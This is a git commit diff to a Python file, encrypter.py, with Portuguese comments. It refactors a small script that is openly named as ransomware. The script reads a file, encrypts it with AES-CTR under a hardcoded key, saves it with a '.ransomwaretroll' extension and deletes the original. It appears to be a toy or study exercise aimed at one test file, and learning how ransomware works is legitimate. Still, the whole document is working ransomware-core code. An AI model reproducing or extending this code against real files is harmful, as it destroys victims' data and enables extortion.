88f71be0e80e15e32c031a9c09efdb67bf2cee67
Isaac Giordani da Rocha <36867782+isaacgiordani@users.noreply.github.com>
2024-12-15 11:51:33 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,36 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
+def criptografar_arquivo(file_name, chave):
+    try:
+        # Abrir o arquivo a ser criptografado
+        with open(file_name, "rb") as file:
+            file_data = file.read()
+        
+        # Criptografar o arquivo
+        aes = pyaes.AESModeOfOperationCTR(chave)
+        crypto_data = aes.encrypt(file_data)
+        
+        # Salvar o arquivo criptografado
+        new_file_name = file_name + ".ransomwaretroll"
+        with open(new_file_name, 'wb') as new_file:
+            new_file.write(crypto_data)
+        
+        # Remover o arquivo original após criptografia bem-sucedida
+        os.remove(file_name)
+        print(f"Arquivo criptografado com sucesso: {new_file_name}")
+    
+    except FileNotFoundError:
+        print(f"Erro: O arquivo {file_name} não foi encontrado.")
+    
+    except Exception as e:
+        print(f"Ocorreu um erro durante a criptografia: {e}")
+
+# Chave de criptografia
+chave = b"testeransomwares"
+
+# Nome do arquivo a ser criptografado
 file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
 
-## remover o arquivo
-os.remove(file_name)
-
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# Criptografar o arquivo
+criptografar_arquivo(file_name, chave)
